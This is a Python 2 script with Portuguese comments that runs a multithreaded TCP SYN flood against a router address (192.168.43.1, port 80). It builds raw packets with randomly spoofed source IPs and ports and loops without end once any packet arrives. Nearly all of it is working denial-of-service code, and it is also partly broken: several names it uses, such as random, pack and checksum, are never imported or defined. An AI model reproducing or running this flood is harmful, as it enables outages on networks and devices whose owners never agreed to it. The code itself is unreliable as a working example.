import socket
import time
from threading import Thread

def show_begin(ip_dest):
    import time
    print 'Iniciando o ataque ao roteador', ip_dest 

def attack(dest_ip): 
    #create a raw socket
    #import time

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()
     
    # tell kernel not to put in headers, since we are providing it
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         
    # now start constructing the packet
    packet = '';
     
    #atacando proprio roteador

    #gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
    #para evitar que sejam todos 255 ou tenha 0.0.0.0
    #source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
    #source_ip = '192.168.0.17'
    #dest_ip = '192.168.0.101' # victor
    #show_who(dest_ip,numero_thread)
    # ip header fields
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
    id = 30  #Id of this packet
    frag_off = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    check = 10  # python seems to correctly fill the checksum

    daddr = socket.inet_aton ( dest_ip )
     
    ihl_version = (version << 4) + ihl
     
    # tcp header fields
    dest = 80   # destination port
    seq = 0
    ack_seq = 0
    doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
    #tcp flags
    fin = 0
    syn = 1 #Setando a flag syn do pacote tcp
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = 5000
    check = 0
    urg_ptr = 0
     
    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
     
    #Send the packet finally - the port specified has no effect
    #print 'O servidor',dest_ip,'esta sendo atacado'
    contador=0
    #put the above line in a loop like while 1: if you want to flood
    while not flag_encerra_threads:
        #parte de gerar o pacote IP, para cada novo endereco de origem de IP gerado
        #gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
        #para evitar que sejam todos 255 ou tenha 0.0.0.0
        source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4))  
        saddr = socket.inet_aton ( source_ip )
        # the ! in the pack format string means network order
        ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

        #parte de gerar o pacote TCP, para cada nova porta gerada
        source = random.randint(4000, 9000) # gera portas de origem aleatorias, entre os intervalos 4000 e 9000
        # the ! in the pack format string means network order
        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

        # pseudo header fields
        source_address = socket.inet_aton( source_ip )
        tcp_length = len(tcp_header)

    	if contador > 49999:
        	print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
        	contador=0
        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
        psh = psh + tcp_header;
         
        tcp_checksum = checksum(psh)
         
        # make the tcp header again and fill the correct checksum
        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
         
        # final full packet - syn packets dont have any data
        packet = ip_header + tcp_header

        s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
        #contador = contador + 1

    s.close() # encerra o socket


def countdown(t):
    while t >= 1:
        print "Iniciando Server em " + str(t) + '...'
        time.sleep(1)
        t -= 1
    print('Server Running! \n')


# create a raw socket and bind it to the public interface
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

HOST = '192.168.43.12'
s.bind(('', 0))



countdown(3)

i = 0

dest_ip = '192.168.43.1'

ataque2 = Thread(target=attack,args=[dest_ip])
ataque3 = Thread(target=attack,args=[dest_ip])
ataque4 = Thread(target=attack,args=[dest_ip])
		

while 1:
	msg = s.recvfrom(12000)
	if msg:
		show_begin(dest_ip)
		ataque2.start()
		ataque3.start()
		ataque4.start()
		



